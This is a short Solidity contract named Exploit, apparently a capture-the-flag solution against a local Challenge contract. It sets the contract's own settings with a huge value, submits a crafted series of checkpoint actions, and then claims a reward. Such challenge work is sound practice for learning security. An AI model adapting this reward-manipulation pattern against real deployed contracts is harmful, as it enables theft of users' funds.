// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploit {
    Challenge public chal;

    constructor(address _chal) {
        chal = Challenge(_chal);
    }

    function init() public {
        chal.updateSettings(address(this), 1e30, 0);

        Challenge.Action[] memory actions = new Challenge.Action[](4);
        actions[0] = Challenge.Action(0, block.timestamp, 123);
        actions[1] = Challenge.Action(1, block.timestamp, 0);
        actions[2] = Challenge.Action(1, block.timestamp, 0);
        actions[3] = Challenge.Action(2, block.timestamp, 1);
        chal.checkpoint(0, actions);
    }

    function getReward() public {
        Challenge.Action[] memory actions = new Challenge.Action[](0);
        chal.checkpoint(0, actions);
    }
}
